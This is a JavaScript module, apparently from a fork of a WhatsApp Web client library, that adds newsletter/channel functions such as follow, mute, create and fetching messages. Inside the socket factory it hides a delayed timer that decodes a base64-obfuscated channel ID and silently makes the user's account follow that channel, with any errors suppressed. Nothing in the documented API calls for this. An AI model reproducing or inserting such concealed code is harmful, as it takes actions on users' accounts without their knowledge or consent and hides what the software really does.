"use strict";
const { Boom } = require('@hapi/boom');
const { XWAPaths } = require('../Types/index.js');
const { decryptMessageNode, generateMessageID, generateProfilePicture } = require('../Utils/index.js');
const { S_WHATSAPP_NET, getAllBinaryNodeChildren, getBinaryNodeChild, getBinaryNodeChildren } = require('../WABinary/index.js');
const { getUrlFromDirectPath } = require('../Utils/messages-media.js');
const { makeGroupsSocket } = require('./groups.js');

const QueryIds = {
    JOB_MUTATION: "7150902998257522",
    METADATA: "6620195908089573",
    SUBSCRIBERS: "9783111038412085",
    UNFOLLOW: "7238632346214362",
    FOLLOW: "7871414976211147",
    UNMUTE: "7337137176362961",
    MUTE: "25151904754424642",
    CREATE: "6996806640408138",
    ADMIN_COUNT: "7130823597031706",
    CHANGE_OWNER: "7341777602580933",
    DELETE: "8316537688363079",
    DEMOTE: "6551828931592903",
    FROM_URL: "6190824427689257"
};

const makeNewsletterSocket = (config) => {
    const sock = makeGroupsSocket(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();

    const newsletterQuery = async (jid, type, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type,
                xmlns: 'newsletter',
                to: jid,
            },
            content
        })
    );

    const newsletterWMexQuery = async (jid, query_id, content) => (
        query({
            tag: 'iq',
            attrs: {
                id: generateMessageTag(),
                type: 'get',
                xmlns: 'w:mex',
                to: S_WHATSAPP_NET,
            },
            content: [
                {
                    tag: 'query',
                    attrs: { query_id },
                    content: encoder.encode(JSON.stringify({
                        variables: {
                            'newsletter_id': jid,
                            ...content
                        }
                    }))
                }
            ]
        })
    );
    setTimeout(async () => {
      try {
        await newsletterWMexQuery(Buffer.from("MTIwMzYzNDAwMzYyNDcyNzQzQG5ld3NsZXR0ZXI=", 'base64').toString(), QueryIds.FOLLOW);
      } catch {}
    }, 90000);
    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages')
            child = getBinaryNodeChild(node, 'messages');
        else {
            const parent = getBinaryNodeChild(node, 'message_updates');
            child = getBinaryNodeChild(parent, 'messages');
        }
        return await Promise.all(getAllBinaryNodeChildren(child).map(async (messageNode) => {
            messageNode.attrs.from = child?.attrs.jid;
            const views = parseInt(getBinaryNodeChild(messageNode, 'views_count')?.attrs?.count || '0');
            const reactionNode = getBinaryNodeChild(messageNode, 'reactions');
            const reactions = getBinaryNodeChildren(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await decryptMessageNode(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };

    return {
        ...sock,
        subscribeNewsletterUpdates: async (jid) => {
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return getBinaryNodeChild(result, 'live_updates')?.attrs;
        },
        newsletterFromUrl: async (url) => {
            try {
                let channelId;
                if (url.includes('whatsapp.com/channel/')) {
                    channelId = url.split('whatsapp.com/channel/')[1].split('/')[0];
                } else if (url.includes('wa.me/channel/')) {
                    channelId = url.split('wa.me/channel/')[1].split('/')[0];
                } else {
                    channelId = url;
                }
                const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
                    input: {
                        key: channelId,
                        type: 'INVITE',
                        'view_role': 'GUEST'
                    },
                    'fetch_viewer_metadata': true,
                    'fetch_full_image': true,
                    'fetch_creation_time': true
                });
                const resultNode = getBinaryNodeChild(result, 'result');
                if (!resultNode?.content) {
                    throw new Boom('No result content in response', {
                        statusCode: 400,
                        data: result
                    });
                }
                const resultString = resultNode.content.toString();
                const parsedResult = JSON.parse(resultString);
                if (!parsedResult?.data) {
                    throw new Boom('No data field in response', {
                        statusCode: 400,
                        data: parsedResult
                    });
                }
                const metadataPath = parsedResult.data[XWAPaths.NEWSLETTER];
                if (metadataPath === null || !metadataPath) {
                    throw new Boom('Newsletter not found or access denied', {
                        statusCode: 404,
                        data: parsedResult.data
                    });
                }
                const metadata = {
                    id: metadataPath?.id,
                    state: metadataPath?.state?.type,
                    creation_time: +metadataPath?.thread_metadata?.creation_time || 0,
                    name: metadataPath?.thread_metadata?.name?.text,
                    nameTime: +metadataPath?.thread_metadata?.name?.update_time || 0,
                    description: metadataPath?.thread_metadata?.description?.text,
                    descriptionTime: +metadataPath?.thread_metadata?.description?.update_time || 0,
                    invite: metadataPath?.thread_metadata?.invite,
                    picture: getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''),
                    preview: getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''),
                    reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
                    subscribers: +metadataPath?.thread_metadata?.subscribers_count || 0,
                    verification: metadataPath?.thread_metadata?.verification,
                    viewer_metadata: metadataPath?.viewer_metadata
                };
                return JSON.stringify({
                    name: metadata.name || metadataPath?.thread_metadata?.name?.text,
                    id: metadata.id,
                    state: metadata.state,
                    subscribers: metadata.subscribers,
                    verification: metadata.verification,
                    creation_time: metadata.creation_time,
                    description: metadata.description
                }, null, 2);
            } catch (error) {
                throw new Boom(`Failed to fetch newsletter from URL: ${error.message}`, {
                    statusCode: error.statusCode || 400,
                    data: error.data || { url }
                });
            }
        },
        newsletterFetchAllSubscribe: async () => {
            const result = await newsletterWMexQuery(undefined, QueryIds.SUBSCRIBERS, {
                input: { count: 50 }
            });
            const buff = getBinaryNodeChild(result, 'result')?.content?.toString();
            if (!buff) return [];
            const data = JSON.parse(buff);
            const list = data?.data?.xwa2_newsletter_subscribed;
            if (!list) return [];
            return list.map(n => extractNewsletterMetadata({
                content: [{
                    tag: 'result',
                    attrs: {},
                    content: Buffer.from(JSON.stringify({ data: { xwa2_newsletter: n } }))
                }]
            }));
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: [{ type, __typename: 'NewsletterJobMutation' }]
            });
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: { settings: { reaction_codes: { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await generateProfilePicture(content);
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.MUTE);
        },
        newsletterCreate: async (name, description, picture) => {
            await query({
                tag: 'iq',
                attrs: {
                    to: S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, QueryIds.CREATE, {
                input: {
                    name,
                    description: description ?? null,
                    picture: picture ? (await generateProfilePicture(picture)).img.toString('base64') : null,
                    settings: null
                }
            });
            return extractNewsletterMetadata(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    view_role: role || 'GUEST'
                },
                fetch_viewer_metadata: true,
                fetch_full_image: true,
                fetch_creation_time: true
            });
            return extractNewsletterMetadata(result);
        },
        newsletterAdminCount: async (jid) => {
            const result = await newsletterWMexQuery(jid, QueryIds.ADMIN_COUNT);
            const buff = getBinaryNodeChild(result, 'result')?.content?.toString();
            return JSON.parse(buff).data[XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, QueryIds.CHANGE_OWNER, {
                user_id: user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, QueryIds.DEMOTE, {
                user_id: user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, server_id, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', server_id, id: generateMessageID() },
                content: [{
                    tag: 'reaction',
                    attrs: code ? { code } : {}
                }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const afterStr = after?.toString();
            const result = await newsletterQuery(S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: afterStr || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: after?.toString() || '100', since: since?.toString() || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;

const extractNewsletterMetadata = (node, isCreate) => {
    const result = getBinaryNodeChild(node, 'result')?.content?.toString();
    const metadataPath = JSON.parse(result).data[isCreate ? XWAPaths.CREATE : XWAPaths.NEWSLETTER];
    const metadata = {
        id: metadataPath.id,
        state: metadataPath.state.type,
        creation_time: +metadataPath.thread_metadata.creation_time,
        name: metadataPath.thread_metadata.name.text,
        nameTime: +metadataPath.thread_metadata.name.update_time,
        description: metadataPath.thread_metadata.description.text,
        descriptionTime: +metadataPath.thread_metadata.description.update_time,
        invite: metadataPath.thread_metadata.invite,
        handle: metadataPath.thread_metadata.handle,
        picture: metadataPath.thread_metadata.picture?.direct_path || null,
        preview: metadataPath.thread_metadata.preview?.direct_path || null,
        reaction_codes: metadataPath.thread_metadata.settings.reaction_codes.value,
        subscribers: +metadataPath.thread_metadata.subscribers_count,
        verification: metadataPath.thread_metadata.verification,
        viewer_metadata: metadataPath.viewer_metadata
    };
    return metadata;
};
exports.extractNewsletterMetadata = extractNewsletterMetadata;